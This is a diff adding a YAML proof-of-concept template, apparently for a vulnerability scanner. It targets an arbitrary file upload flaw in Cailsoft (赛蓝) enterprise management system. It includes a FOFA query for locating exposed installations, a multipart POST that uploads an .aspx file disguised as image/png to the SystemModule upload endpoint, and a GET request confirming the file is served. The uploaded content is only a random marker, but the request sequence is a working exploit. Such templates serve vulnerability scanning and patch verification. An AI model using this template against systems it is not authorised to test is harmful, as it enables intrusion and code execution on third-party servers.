@@ -1,0 +1,26 @@
+id: poc-yaml-cailsoft-systemmodule-anyflie-upload
+info:
+  name: 赛蓝企业管理系统 SystemModule 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 企业管理系统
+  fofa: body="www.cailsoft.com" || body="赛蓝企业管理系统"
+variables:
+  t1: random_str(8)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /SystemModule/System_FocusList/SubmitUploadify?FolderId=1&UserId=1
+  headers:
+    Content-Type: multipart/form-data;boundary=---------------------------142851345723692939351758052805
+  data: "-----------------------------142851345723692939351758052805\nContent-Disposition:\
+    \ form-data; name=\"Filedata\"; filename=\"{{.t1}}.aspx\"\nContent-Type: image/png\
+    \ \n\n{{.t2}}\n-----------------------------142851345723692939351758052805--"
+  expression: status_code == 200 && contains(body,"NetworkFile")
+  output:
+  - regex_match(body,"AppFiles/(?P<file>[0-9]+).aspx")
+- method: GET
+  path: /Resource/UploadFile/AppFiles/{{.file}}.aspx
+  expression: status_code == 200 && body == t2
+transport: http
